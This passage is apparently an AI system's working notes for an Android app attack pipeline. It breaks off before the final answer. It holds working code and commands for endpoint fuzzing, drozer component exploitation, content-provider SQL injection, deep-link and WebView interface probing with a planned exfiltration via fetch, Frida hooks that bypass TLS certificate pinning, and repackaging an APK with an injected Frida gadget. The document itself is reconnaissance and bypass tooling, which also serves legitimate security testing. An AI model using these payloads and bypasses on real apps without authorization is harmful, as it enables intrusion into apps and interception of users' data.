Also `strings classes.dex | grep -E '^/|http'`.

Then run mitmproxy, drive app, export flows, filter endpoints: `mitmdump -w flows.mitm` then `mitmproxy -r flows.mitm`.

Also `ffuf` for endpoint fuzzing:
```bash
ffuf -u https://api.target/FUZZ -w wordlist -H "Authorization: Bearer $TOKEN"
```

Also mention `apktool`/`jadx` for `network_security_config` and `strings.xml` for api keys.

OK. Also include:
- `adb shell pm list packages -3`
- `adb shell dumpsys package com.pkg` for exported components & permissions
- `adb shell cmd package resolve-activity`

Drozer:
```bash
# install drozer agent apk on device, forward port
adb forward tcp:31415 tcp:31415
drozer console connect
run app.package.attacksurface com.pkg
run app.activity.info -a com.pkg
run app.service.info -a com.pkg
run app.broadcast.info -a com.pkg
run app.provider.info -a com.pkg
run app.provider.finduri com.pkg
run scanner.provider.injection -a com.pkg
run scanner.provider.traversal -a com.pkg
run app.activity.start --component com.pkg com.pkg.AdminActivity --extra string key value
run app.broadcast.send --action com.pkg.SECRET --extra string foo bar
```

Also `adb shell am start` equivalents.

Provider SQLi test via content query:
```bash
adb shell content query --uri content://com.pkg.provider/users --where "1=1"
adb shell content query --uri content://com.pkg.provider/users --where "1=1) UNION SELECT ..."
```
Hmm content query --where supports SQL injection if provider concatenates — test with `--where "1=1 OR 1=1"`.

Deep link enumeration:
```bash
grep -n "android.intent.action.VIEW" -A5 out/AndroidManifest.xml
aapt dump badging app.apk | grep -i launchable
# test
adb shell am start -W -a android.intent.action.VIEW -d "scheme://host/path?x=1"
```
Use `dumpsys`? Or `apktool` manifest. Also `adb shell pm get-app-links`.

WebView test payload:
Host an HTML page reachable from device (adb reverse or LAN), with:
```html
<script>
  // probe exposed interfaces
  for (const k in window) { try { if (typeof window[k] === 'object' && window[k] !== null) document.write(k + '<br>'); } catch(e){} }
</script>
```
Then call interface methods. Include a file:// read test: `loadUrl("file:///android_asset/...")` and JS interface → exfil via fetch.

Frida hook to list JS interfaces:
```js
Java.perform(function(){
  var WV = Java.use('android.webkit.WebView');
  WV.addJavascriptInterface.implementation = function(obj, name){
    console.log('[webview] addJavascriptInterface name=' + name + ' class=' + obj.getClass().getName());
    return this.addJavascriptInterface(obj, name);
  };
  WV.loadUrl.overload('java.lang.String').implementation = function(u){ console.log('[webview] loadUrl ' + u); return this.loadUrl(u); };
  WV.setJavaScriptEnabled... // WebSettings
  var WS = Java.use('android.webkit.WebSettings');
  WS.setAllowFileAccessFromFileURLs.implementation = function(b){ console.log('[webview] setAllowFileAccessFromFileURLs '+b); return this.setAllowFileAccessFromFileURLs(b); };
});
```

Good.

Also intent redirection hook:
```js
var Activity = Java.use('android.app.Activity');
Activity.startActivity.overload('android.content.Intent').implementation = function(i){ console.log('[intent] startActivity ' + i); return this.startActivity(i); };
```

Now, final assembly. I'll write it with headers and dense code blocks. No meta commentary. Provide a brief pipeline order at top maybe. Keep prose minimal per instruction "Prioritize complete commands and payloads over prose."

Let me write.

I should be careful with the SSLContext.init array creation:
```js
var TrustManagerArr = Java.array('javax.net.ssl.TrustManager', [TM.$new()]);
```
That's correct Frida syntax: `Java.array('javax.net.ssl.TrustManager', [obj])`.

Also OkHttp3 CertificatePinner.check overloads: `check(String, List)` in okhttp3 ≥3.x; also `check(String, Certificate...)`? The method is `check(String hostname, List<Certificate> peerCertificates)`. Older 2.x had `check(String, Certificate[])`. Hook both.

TrustManagerImpl: method `checkTrustedRecursive(java.util.List, java.lang.String, boolean, java.util.List, java.util.List, java.util.Set)`? Actually signature: `checkTrustedRecursive(List<X509Certificate> untrustedChain, String host, boolean clientAuth, List<X509Certificate> trustAnchorChain, Set<TrustAnchor> trustAnchors, List<X509Certificate> ocspResponses)`? It varies by Android version. I'll hook with generic: `TMI.checkTrustedRecursive.overload(...)` may fail; instead hook `checkTrusted`:
`checkTrusted(String hostname, byte[][] peerCertChain, List<X509Certificate> untrustedChain, List<X509Certificate> trustAnchorChain, Set<TrustAnchor> trustAnchors, List<X509Certificate> ocspResponses)` — also version-dependent.

Safer: hook `javax.net.ssl.X509TrustManager.checkServerTrusted` implementations? Can't easily. But hooking SSLContext.init covers apps that build trust managers. For Conscrypt default, hook `com.android.org.conscrypt.TrustManagerImpl.checkTrustedRecursive` with retry across overloads:

```js
function hookAll(cls, name, impl){
  cls[name].overloads.forEach(function(o){ try{ o.implementation = impl; }catch(e){} });
}
```
That's clean. Use it.

For TrustManagerImpl, return empty list from checkTrustedRecursive. But checkTrusted isn't the entrypoint on newer; checkTrustedRecursive is. Returning empty ArrayList should mean "trusted". Actually returning empty list means no additional anchors; the caller then... Hmm. The common working bypass returns an empty ArrayList for `checkTrustedRecursive`. I'll do:

```js
try {
  var TMI = Java.use('com.android.org.conscrypt.TrustManagerImpl');
  TMI.checkTrustedRecursive.overloads.forEach(function(o){
    o.implementation = function(){ 
      console.log('[ssl] TrustManagerImpl.checkTrustedRecursive');
      return Java.use('java.util.ArrayList').$new(); 
    };
  });
} catch(e){}
```

Good enough, plus SSLContext.init hook.

Also hook `checkTrusted` on `com.android.org.conscrypt.TrustManagerImpl`? Returning null/empty... skip; checkTrustedRecursive is the one used.

Also `Platform.checkServerTrusted`? skip.

Now write final.

One more: Frida gadget config file name — when library is `libfrida-gadget.so`, config is `libfrida-gadget.config`. Yes.

And the gadget "listen" interaction requires the app to keep running; connect with `frida -H 127.0.0.1:27042 -l script.js`. With `adb forward tcp:27042 tcp:27042`.

Alternatively use "connect" type for connecting back to a frida host. Listen is fine.

For smali injection: find `<application android:name="...">` class. Simpler: objection patchapk. I'll give manual:

```
# 1. add gadget lib into out/lib/<abi>/
# 2. find Application class smali: grep -rl "Landroid/app/Application;" out/smali*/  or check manifest android:name
# 3. inject in that class's <clinit> or onCreate:
    const-string v0, "frida-gadget"
    invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V
```
If no Application class, add one to manifest and create smali. I'll give a snippet.

Actually simpler robust manual path: inject into MainActivity `onCreate` at the top — but Application is better (loads before detection). I'll note both; give objection as primary.

Write it.

Also include rebuilding: `apktool b out -o patched.apk` then zipalign and apksigner.

Also mention `adb install -r` after uninstall.

Also mention `frida -U -f com.pkg -l script.js` spawn; newer frida needs `%resume` or `--no-pause` removed; use `frida -U -f com.pkg -l s.js` then `%resume`. Actually default behavior: frida resumes automatically when script is loaded unless you use `--pause`? Hmm. In frida 15+, `-f` spawns and the process is paused; frida CLI resumes automatically after loading the script by default (`--no-pause` deprecated/removed because default is resume). I'll just note `%resume` if needed.

Let me write the final answer with clear sections. Dense.

Include a small table of contents? Not necessary.

Length: this is a big pipeline; go comprehensive but no filler.

Write now.

I need to be careful not to make it too long-winded in prose; mostly code.

Let me produce.
